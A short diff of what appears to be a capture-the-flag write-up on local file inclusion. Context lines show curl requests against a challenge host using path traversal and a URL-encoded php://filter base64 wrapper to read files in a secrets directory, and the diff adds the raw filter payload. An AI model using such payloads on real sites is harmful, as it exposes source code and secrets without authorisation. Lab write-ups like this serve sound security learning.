@@ -95,6 +95,7 @@ curl "https://sit-lfi.chals.io/translations.php?page=..//...//secrets/review.txt
 curl -s "https://sit-lfi.chals.io/archive.php?page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3D..%2Fsecrets%2Faudit.php"
 ```
 
+php://filter/convert.base64-encode/resource=../secrets/audit.php
 #### Response & Decoding
 ```html
 <div class="document">
